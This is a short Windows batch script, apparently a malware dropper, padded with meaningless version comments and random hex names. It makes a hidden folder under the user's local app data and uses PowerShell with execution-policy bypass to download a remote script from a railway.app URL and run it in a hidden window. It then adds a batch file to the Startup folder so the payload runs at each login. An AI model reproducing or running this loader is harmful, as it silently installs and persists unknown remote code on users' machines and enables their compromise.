@echo off
REM Ver706
setlocal EnableDelayedExpansion
REM Ver213
REM Mod469

REM [ddb345d1eae72e39a347204a9f3d2fb4]

set "fp=%LOCALAPPDATA%\2df0ea30ef"
set "fn=609c4d9566.ps1"
set "ur=https://web-production-9d7cc.up.railway.app/client.ps1"

REM Proc219
if not exist "%fp%" mkdir "%fp%"

REM Sys429
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%ur%','%fp%\%fn%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f %fp%\%fn%' -WindowStyle Hidden"

REM Core529
set "su=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%su%\1646cc.bat" (
    echo @echo off> "%su%\1646cc.bat"
    echo powershell -w hidden -ep bypass -f "%fp%\%fn%">> "%su%\1646cc.bat"
)

REM Core698
exit /b 0

REM [4F50F3E534269C61EFE06E45]
